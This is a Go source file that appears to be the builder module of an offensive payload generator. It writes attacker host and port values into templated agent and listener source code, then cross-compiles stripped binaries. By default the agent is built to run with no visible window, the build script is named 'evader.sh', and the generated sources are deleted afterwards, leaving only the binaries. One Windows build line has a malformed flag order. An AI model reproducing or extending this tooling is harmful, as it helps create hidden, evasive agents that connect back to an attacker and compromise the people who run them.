package binmaker

import (
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

var outFolderPath string

type UserOptions struct {
	AppType                  string
	AgentOS                  string
	AgentArch                string
	ListenerOS               string
	ListenerArch             string
	Rhost                    string
	Rport                    string
	TargetBinaryPath         string
	TargetBinaryFileNameOnly string
	SaveAs                   string
	SourceCodePath           string
	SourceCodeFileNameOnly   string
	DecodedSourceCode        string
	UpdatedSourceCode        string
}

type IBinaryBuilder interface {
	SourceToBinary(finflag chan string, exepath, gofilepath string)
	GetUpdateSourceCode() string
	ClearAllSource()
	CreateSourceFile()
}

func checkerror(err error) {
	if err != nil {
		fmt.Println(err)
		//return
	}
}

func (oUserOptions *UserOptions) UpdateSourceCode(isListener bool) {
	oUserOptions.UpdatedSourceCode = strings.Replace(oUserOptions.DecodedSourceCode, "RHOST", oUserOptions.Rhost, 1)
	oUserOptions.UpdatedSourceCode = strings.Replace(oUserOptions.UpdatedSourceCode, "RPORT", oUserOptions.Rport, 1)
	if !isListener {
		oUserOptions.SourceCodePath = `out` + string(os.PathSeparator) + `udptest.go`
		//oUserOptions.SourceCodePath = getcurrentdirforops() + string(os.PathSeparator) + `udptest.go`
		fmt.Println(oUserOptions.SourceCodePath)
		oUserOptions.SourceCodeFileNameOnly = `udptest.go`
		if oUserOptions.AgentOS == "windows" {
			oUserOptions.TargetBinaryPath = `out` + string(os.PathSeparator) + oUserOptions.SaveAs + ".exe"
			oUserOptions.TargetBinaryFileNameOnly = oUserOptions.SaveAs + ".exe"
		} else {
			oUserOptions.TargetBinaryPath = `out` + string(os.PathSeparator) + oUserOptions.SaveAs + ".bin"
			oUserOptions.TargetBinaryFileNameOnly = oUserOptions.SaveAs + ".bin"

		}
	} else {
		//oUserOptions.UpdatedSourceCode = strings.Replace(oUserOptions.DecodedSourceCode, "LPORT", oUserOptions.Rport, 1)
		oUserOptions.SourceCodePath = `out` + string(os.PathSeparator) + `udptestlistener.go`
		oUserOptions.SourceCodeFileNameOnly = `udptestlistener.go`

		if oUserOptions.ListenerOS == "windows" {
			oUserOptions.TargetBinaryPath = `out` + string(os.PathSeparator) + oUserOptions.SaveAs + "listener.exe"
			oUserOptions.TargetBinaryFileNameOnly = oUserOptions.SaveAs + "listener.exe"

		} else {
			oUserOptions.TargetBinaryPath = `out` + string(os.PathSeparator) + oUserOptions.SaveAs + "listener" + ".bin"
			oUserOptions.TargetBinaryFileNameOnly = oUserOptions.SaveAs + "listener" + ".bin"

		}
	}
}
func (oUserOptions *UserOptions) CreateSourceFile() {
	fmt.Println("Source file" + oUserOptions.SourceCodePath)
	newFile, err := os.Create(oUserOptions.SourceCodePath)
	checkerror(err)
	newFile.WriteString(oUserOptions.UpdatedSourceCode)
	newFile.Close()
}
func (oUserOptions *UserOptions) CheckAndCreateOutFolder() (string, error) {
	currentDir, err := os.Getwd()
	if err != nil {
		return "", err

	}
	// Create the "out" folder path
	outFolderPath = filepath.Join(currentDir, "out")

	// Create the "out" folder if it doesn't exist
	err = os.MkdirAll(outFolderPath, 0755)
	if err != nil {
		return "", err
	}
	return outFolderPath, nil
}
func (oUserOptions *UserOptions) ModGen() {

	// Get the current working directory
	modulePath := "out"

	// Create the module file content
	moduleFileContent := fmt.Sprintf("module %s\n\n", modulePath)

	// Determine the target directory for the go.mod file
	modfilepath := filepath.Join(outFolderPath, "go.mod")

	// Create the go.mod file
	file, err := os.Create(modfilepath)
	if err != nil {
		fmt.Printf("Failed to create go.mod file: %v\n", err)
		return
	}

	// Write the module file content to the go.mod file
	fmt.Println("writing to mod file")
	_, err = file.WriteString(moduleFileContent)
	if err != nil {
		fmt.Printf("Failed to write module file content: %v\n", err)
		return
	}
	file.Close()
}

func buildfromwindows(scriptname string) {
	currentDir, targetPath := rungomodtidy()
	scriptPath := filepath.Join(targetPath, scriptname)

	err := exec.Command(scriptPath).Run()
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println("Build Success !")
		fmt.Println(targetPath)
	}
	err = os.Chdir(currentDir)
	if err != nil {
		fmt.Printf("Failed to change directory: %v\n", err)
		return
	}
}

func rungomodtidy() (string, string) {
	targetDir := "out"
	currentDir, err := os.Getwd()
	if err != nil {
		fmt.Printf("Failed to get the current working directory: %v\n", err)
		return "", ""
	}
	targetPath := filepath.Join(currentDir, targetDir)
	fmt.Println(targetPath)
	err = os.Chdir(targetPath)
	if err != nil {
		fmt.Printf("Failed to change directory: %v\n", err)
		return "", ""
	}

	cmd := exec.Command("go", "mod", "tidy")
	err = cmd.Run()
	if err != nil {
		fmt.Printf("Failed to run go mod tidy: %v\n", err)
		return "", ""
	}
	fmt.Println("go mod tidy executed successfully!")
	return currentDir, targetPath

}

func runshellscripttobuildbinary(scriptname string) {
	currentDir, targetPath := rungomodtidy()
	scriptPath := filepath.Join(targetPath, scriptname)
	fmt.Println(scriptPath)
	cmd := exec.Command("chmod", "+x", scriptPath)
	err := cmd.Run()
	if err != nil {
		fmt.Printf("Failed to apply chmod +x to the script: %v\n", err)
		return
	}
	//fmt.Println("chmod +x executed successfully!")
	fmt.Println(scriptPath)
	cmd = exec.Command("bash", scriptPath)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	err = cmd.Run()
	if err != nil {
		fmt.Printf("Failed to run the shell script: %v\n", err)
		return
	}
	//fmt.Println("Shell script executed successfully!")
	err = os.Chdir(currentDir)
	if err != nil {
		fmt.Printf("Failed to change directory: %v\n", err)
		return
	}
	//fmt.Println("CD.. to evader running dir")

}
func (oUserOptions *UserOptions) SourceToBinary(isListener bool, finflag chan string) {
	binpath := oUserOptions.TargetBinaryFileNameOnly + " " + oUserOptions.SourceCodeFileNameOnly
	//binpath := oUserOptions.TargetBinaryPath + " " + oUserOptions.SourceCodePath

	fmt.Println("building binary.....")
	if runtime.GOOS == "linux" {
		var execargs string
		buildscriptpath := `out` + string(os.PathSeparator) + `evader.sh`
		evader, err := os.Create(buildscriptpath)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(buildscriptpath)
		if isListener {
			execargs = "GOOS=" + oUserOptions.ListenerOS + " GOARCH=" + oUserOptions.ListenerArch + ` go build -ldflags="-s -w" -buildmode=exe -o ` + binpath
			evader.WriteString(execargs + "\n")
		} else {
			execargs = "GOOS=" + oUserOptions.AgentOS + " GOARCH=" + oUserOptions.AgentArch + ` go build -ldflags="-s -w" -buildmode=exe -H=windowsgui -o ` + binpath
			if strings.ToLower(oUserOptions.AppType) == "console" {
				execargs = "GOOS=" + oUserOptions.AgentOS + " GOARCH=" + oUserOptions.AgentArch + ` go build -ldflags="-s -w" -buildmode=exe -o ` + binpath
			}
			evader.WriteString(execargs + "\n")
		}
		evader.Close()
		runshellscripttobuildbinary(filepath.Base(buildscriptpath))

	} else {
		buildpath := `out` + string(os.PathSeparator) + `build.bat`
		buildbat, err := os.Create(buildpath)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Println(buildpath)
		if isListener {
			buildbat.WriteString("SET GOOS=" + oUserOptions.ListenerOS + "\n")
			buildbat.WriteString("SET GOARCH=" + oUserOptions.ListenerArch + "\n")
		} else {
			buildbat.WriteString("SET GOOS=" + oUserOptions.AgentOS + "\n")
			buildbat.WriteString("SET GOARCH=" + oUserOptions.AgentArch + "\n")
		}
		if strings.ToLower(oUserOptions.AppType) == "console" {
			buildbat.WriteString(`go build -o -ldflags="-s -w" -buildmode=exe -o ` + binpath)
		} else {
			buildbat.WriteString(`go build -ldflags="-s -w" -buildmode=exe -H=windowsgui -o ` + binpath)
		}
		buildbat.Close()
		//buildfromwindows("buildpath", oUserOptions.TargetBinaryPath)
		buildfromwindows(filepath.Base(buildpath))
	}
	finflag <- "Build Success"
}

func (oUserOptions *UserOptions) ClearAllSource() {

	targefolderPath := "out"
	files, err := ioutil.ReadDir(targefolderPath)
	if err != nil {
		fmt.Printf("Failed to read directory: %v\n", err)
		return
	}

	for _, file := range files {
		filePath := filepath.Join(targefolderPath, file.Name())

		if !strings.HasSuffix(file.Name(), ".exe") && !strings.HasSuffix(file.Name(), ".bin") {
			err = os.Remove(filePath)
			if err != nil {
				fmt.Printf("Failed to delete file: %v\n", err)
				return
			}
			//fmt.Printf("Deleted file: %s\n", filePath)
		}
	}
	fmt.Println("Cleared all successfully!")
}
